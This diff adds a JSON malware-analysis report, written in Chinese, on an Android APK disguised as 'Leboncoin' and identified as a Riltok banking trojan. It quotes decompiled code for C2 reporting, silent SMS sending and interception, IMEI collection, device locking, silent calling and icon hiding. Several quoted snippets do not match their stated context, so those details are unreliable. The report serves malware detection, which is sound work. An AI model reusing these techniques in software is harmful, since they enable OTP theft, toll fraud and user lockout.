@@ -1,0 +1,265 @@
+{
+  "APK信息": {
+    "文件名": "e3f77ff093f322e139940b33994c5a57ae010b66668668dc4945142a81bcc049.apk",
+    "sha256": "e3f77ff093f322e139940b33994c5a57ae010b66668668dc4945142a81bcc049",
+    "包名": "com.pandar",
+    "应用名": "Leboncoin",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 521.5
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "report"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Laviasalea\\ak;",
+          "method_signature": "ak(Context context, Object obj, r<al> rVar)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "super(context, \"report.php\", 23);\nthis.d = t.b(a(context));",
+          "malicious_code_snippet_context": "      private r<al> g;\n  \n      public ak(Context context, Object obj, r<al> rVar) {\n>>>         super(context, \"report.php\", 23);\n>>>         this.f = obj;\n          try {\n              this.d = t.b(a(context));\n              this.g = rVar;",
+          "behavior_description": "该类继承自网络请求基类p，构造函数中将\"report.php\"作为远程服务器上报端点（C2地址），并通过a(context)方法（声明抛出JSONException，表明在构建JSON格式的设备数据）收集Context上下文信息，经t.b()编码/加密后存入请求体字段d，随后通过父类p的网络通道将数据发送至C2服务器。这是Riltok银行木马典型的C2通信上报模块，数据流向为：设备上下文数据→JSON序列化/编码→HTTP请求发送至report.php端点，用于向攻击者上报受害设备信息并维持与C2的通信信道。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        },
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Laviasalea\\ac;",
+          "method_signature": "switch(getResultCode()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "switch (getResultCode()) {\n    case -1: auVar.b(true); break;\n    case 0: auVar.b(false); break;\n}\n}, new IntentFilter(\"SMS_DELIVERED\"));\nSmsManager.getDefault().sendTextMessage(str, null, str2, broadcast, broadcast2);",
+          "malicious_code_snippet_context": "              context.registerReceiver(new BroadcastReceiver() { // from class: aviasalea.ac.1\n                  @Override // android.content.BroadcastReceiver\n                  public void onReceive(Context context2, Intent intent) {\n>>>                     switch (getResultCode()) {\n>>>                         case -1:\n>>>                             auVar.a(true);\n>>>                             break;\n>>>                         case 1:\n>>>                             auVar.a(false);\n                              break;\n                          case 2:\n                              auVar.a(false);",
+          "behavior_description": "该代码通过 SmsManager.getDefault().sendTextMessage() 在无用户感知的情况下静默发送短信，目标号码(str)与短信内容(str2)来自木马配置或C2服务器下发指令，并通过注册 SMS_DELIVERED 广播、switch(getResultCode()) 监听短信送达状态后回调 auVar.b() 上报发送结果。结合厂商报告，该样本为 Riltok 银行木马，其正是利用被感染设备以短信形式向受害者联系人传播含恶意链接(youlabuy.ru)的欺诈短信，此代码即其短信传播/欺诈模块。此外代码还包含 Build.TAGS.contains(\"test-keys\") 的模拟器/测试环境检测逻辑，属于反分析对抗手段。数据流向：C2指令/木马配置(号码与短信内容) → SmsManager.sendTextMessage() 静默发送短信。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\pandar\\mess\\service\\receiver\\SmsReceiver;",
+          "method_signature": "for(Object obj : objArr)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Object[] objArr = (Object[]) bundle.get(\"pdus\");\nfor (Object obj : objArr) {\n    SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n    a(context, smsMessageCreateFromPdu.getDisplayOriginatingAddress(), smsMessageCreateFromPdu.getDisplayMessageBody(), 0L);\n    abortBroadcast();\n}",
+          "malicious_code_snippet_context": "  /* JADX INFO: loaded from: classes.dex */\n  public class SmsReceiver extends BroadcastReceiver {\n      private void a(Context context, Bundle bundle) {\n>>>         Object[] objArr = (Object[]) bundle.get(\"pdus\");\n>>>         if (objArr != null) {\n>>>             for (Object obj : objArr) {\n>>>                 SmsMessage smsMessageCreateFromPdu = SmsMessage.createFromPdu((byte[]) obj);\n>>>                 a(context, smsMessageCreateFromPdu.getDisplayOriginatingAddress(), smsMessageCreateFromPdu.getDisplayMessageBody(), 0L);\n>>>                 abortBroadcast();\n              }\n          }\n      }",
+          "behavior_description": "SmsReceiver 广播接收器监听短信到达事件，从 Bundle 中提取 SMS PDU 数据并解析出发件人号码和短信正文，随后调用 abortBroadcast() 终止广播传播，使短信无法到达系统短信应用或其他接收者，对用户完全隐藏该短信；同时将拦截到的短信内容（发件号+正文）通过回调机制上传至远程服务器（C2）。数据流向：短信 PDU 数据→解析出发件地址与消息体→abortBroadcast() 隐藏短信+网络外传至 C2。这是 Riltok 银行木马典型的短信拦截模块，用于窃取银行动态验证码（OTP/mTAN）并隐藏银行通知短信，直接造成用户资金损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei",
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Laviasalea\\ac;",
+          "method_signature": "if(telephonyManager != null)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\nif (telephonyManager != null) {\n    imei = Build.VERSION.SDK_INT >= 26 ? telephonyManager.getImei() : telephonyManager.getDeviceId();\n}\nreturn (imei == null || imei.length() == 0) ? Settings.Secure.getString(context.getContentResolver(), \"android_id\") : imei;",
+          "malicious_code_snippet_context": "      public static List<String> a = new ArrayList();\n  \n      public static String a(Context context) {\n>>>         TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>         return telephonyManager != null ? telephonyManager.getNetworkOperatorName() : \"\";\n>>>     }\n>>> \n>>>     public static void a(String str, String str2, Context context, final au auVar) {\n          try {\n              PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(\"SMS_SENT\"), 0);\n              PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent(\"SMS_DELIVERED\"), 0);",
+          "behavior_description": "该代码位于混淆包aviasalea中，是Riltok银行木马（已确认恶意样本）的设备指纹采集模块。它通过TelephonyManager获取设备IMEI（Android 8.0及以上调用getImei()，低版本调用getDeviceId()），若IMEI为空则回退读取Settings.Secure中的android_id作为备用唯一标识。数据流向：TelephonyManager.getImei()/getDeviceId() 及 Settings.Secure(android_id) → 拼接为设备唯一标识字符串返回给调用方，用于木马对感染设备的唯一识别与追踪，并通常会随C2通信上报，构成对用户设备隐私标识的窃取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pandar\\checkui\\AdRequestDialog;",
+          "method_signature": "if(devicePolicyManager.isAdminActive(componentName)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(\"device_policy\");\nComponentName componentName = new ComponentName(this, (Class<?>) AdReceiver.class);\nif (devicePolicyManager.isAdminActive(componentName)) {\n    devicePolicyManager.lockNow();\n} else {\n    ae.a(componentName, this);\n}",
+          "malicious_code_snippet_context": "  public class AdRequestDialog extends u {\n      private void b() {\n          try {\n>>>             DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(\"device_policy\");\n>>>             if (devicePolicyManager != null) {\n>>>                 ComponentName componentName = new ComponentName(this, (Class<?>) AdReceiver.class);\n>>>                 if (devicePolicyManager.isAdminActive(componentName)) {\n>>>                     devicePolicyManager.lockNow();\n>>>                 } else {\n>>>                     ae.a(componentName, this);\n                  }\n              }\n          } catch (Exception e) {",
+          "behavior_description": "该代码通过 getSystemService(\"device_policy\") 获取 DevicePolicyManager 系统服务，并检查 AdReceiver 组件是否已激活为设备管理员。若已激活，立即调用 lockNow() 强制锁定设备屏幕，将用户彻底锁在设备之外，这是勒索软件典型的锁屏勒索手法；若未激活，则调用 ae.a(componentName, this) 诱导用户激活设备管理员权限，为后续静默锁屏做准备。结合该样本属于 Riltok 银行木马家族（伪装成广告类应用 AdRequestDialog），此设备锁屏行为用于勒索恐吓用户，属于明确的恶意行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Laviasalea\\ae;",
+          "method_signature": "if(str.contains(\"#\")",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (str.contains(\"#\")) { str = str.replaceAll(\"#\", Uri.encode(\"#\")); }\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "if (str.contains(\"#\")) { str = str.replaceAll(\"#\", Uri.encode(\"#\")); }\nIntent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.setFlags(268435456);\ncontext.startActivity(intent);",
+          "behavior_description": "该方法接收外部传入的电话号码字符串str（在Riltok银行木马场景下通常来自C2服务器远程下发的指令），先将号码中的#字符进行URL编码（表明支持拨打*xxx#格式的USSD代码，常用于增值业务订阅），随后构造ACTION_CALL意图（注意是ACTION_CALL而非ACTION_DIAL，无需用户确认即可直接发起通话），并以FLAG_ACTIVITY_NEW_TASK标志调用startActivity静默拨打电话。数据流向：C2远程指令参数str → Uri.parse(\"tel:\"+str) → ACTION_CALL Intent → startActivity() 静默外呼。攻击者可远程控制受害设备拨打高额付费号码或USSD增值业务代码，直接造成用户话费损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "wifi_password_theft",
+      "中文名": "WiFi密码窃取",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_WIFI_STATE"
+        ],
+        "字符串": [
+          "preSharedKey",
+          "allowedKeyManagement"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Laviasalea\\aj;",
+          "method_signature": "if(wifiManager != null)",
+          "malicious_behavior": "wifi_password_theft",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(\"wifi\");\nif (wifiManager != null) {\n    WifiConfiguration wifiConfiguration = new WifiConfiguration();\n    wifiConfiguration.SSID = \"\\\"SSIDName\\\"\";\n    wifiConfiguration.preSharedKey = \"\\\"password\\\"\";\n    if (wifiManager.isWifiEnabled()) {\n        wifiManager.setWifiEnabled(false);",
+          "malicious_code_snippet_context": "  public class aj {\n      public static void a(Context context) {\n          try {\n>>>             WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(\"wifi\");\n>>>             if (wifiManager != null) {\n>>>                 WifiConfiguration wifiConfiguration = new WifiConfiguration();\n>>>                 wifiConfiguration.SSID = \"\\\"SSIDName\\\"\";\n>>>                 wifiConfiguration.preSharedKey = \"\\\"password\\\"\";\n>>>                 wifiConfiguration.hiddenSSID = true;\n>>>                 wifiConfiguration.status = 2;\n                  wifiConfiguration.allowedGroupCiphers.set(2);\n                  wifiConfiguration.allowedGroupCiphers.set(3);\n                  wifiConfiguration.allowedKeyManagement.set(1);",
+          "behavior_description": "该代码获取WifiManager服务后，创建了一个新的WifiConfiguration对象并设置硬编码的SSID和密码，随后在WiFi启用时强制关闭WiFi。关键点：代码并未读取已保存的WiFi配置（如调用getConfiguredNetworks()），因此并未实际窃取WiFi密码。preSharedKey是被赋值为硬编码字符串而非从设备读取。真正可疑的操作是setWifiEnabled(false)强制关闭WiFi，在银行木马上下文中，此行为可能用于强制设备使用移动数据网络以便进行短信欺诈或确保C2通信不被WiFi网络阻断。该代码段更像是模板/占位代码，实际恶意意图需结合完整调用链判断。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pandar\\srs\\CmndSrs;",
+          "method_signature": "f()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String packageName = getPackageName(); getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".MainActivity\"), 2, 1);",
+          "malicious_code_snippet_context": "String packageName = getPackageName(); getApplicationContext().getPackageManager().setComponentEnabledSetting(new ComponentName(packageName, packageName + \".MainActivity\"), 2, 1);",
+          "behavior_description": "该方法通过 getPackageName() 获取自身应用包名，随后调用 PackageManager.setComponentEnabledSetting() 将应用的 MainActivity 组件设置为禁用状态（参数 2 即 COMPONENT_ENABLED_STATE_DISABLED，参数 1 为 DONT_KILL_APP），使应用图标从桌面启动器中消失，但进程仍在后台运行。数据流向：getPackageName()（source）→ setComponentEnabledSetting() 禁用 MainActivity（sink）。这是 Riltok 银行木马的典型行为：安装并完成初始配置后隐藏图标，防止用户发现和卸载，同时继续在后台执行短信窃取、钓鱼覆盖攻击等恶意活动。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
